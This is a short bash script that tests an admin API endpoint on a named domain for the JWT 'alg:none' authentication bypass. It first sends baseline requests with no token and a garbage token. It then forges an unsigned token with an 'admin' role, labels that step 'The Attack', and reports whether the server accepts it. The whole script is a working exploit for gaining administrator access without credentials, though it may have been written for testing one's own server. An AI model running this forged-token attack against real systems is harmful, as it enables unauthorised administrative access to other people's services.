#!/bin/bash

target_url="http://varitywire.com/api/admin/dashboard"

echo "===== TEST 1: No Token (Baseline) ====="
curl -s -o /dev/null -w "Status: %{http_code}\n" "$target_url"

echo ""
echo "===== TEST 2: Garbage Token (Baseline) ====="
curl -s -o /dev/null -w "Status: %{http_code}\n" -H "Authorization: Bearer garbage123" "$target_url"

echo ""
echo "===== TEST 3: alg:none Forged Token (The Attack) ====="

fake_header='{"alg":"none","typ":"JWT"}'
fake_payload='{"id":"999","name":"attacker","role":"admin"}'

header_b64=$(echo -n "$fake_header" | base64 | tr -d '=' | tr '/+' '_-')
payload_b64=$(echo -n "$fake_payload" | base64 | tr -d '=' | tr '/+' '_-')

fake_token="${header_b64}.${payload_b64}."

echo "Forged token: $fake_token"
echo ""

response=$(curl -s -w "\nSTATUS:%{http_code}" -H "Authorization: Bearer $fake_token" "$target_url")
body=$(echo "$response" | sed '$d')
status=$(echo "$response" | grep "STATUS:" | cut -d":" -f2)

echo "Response body: $body"
echo "Status: $status"

echo ""
if [ "$status" == "200" ]; then
    echo "🚨 VULNERABLE: Server accepted a forged token with alg:none!"
else
    echo "✅ SAFE: Server correctly rejected the forged token (jsonwebtoken library blocks alg:none by default)"
fi
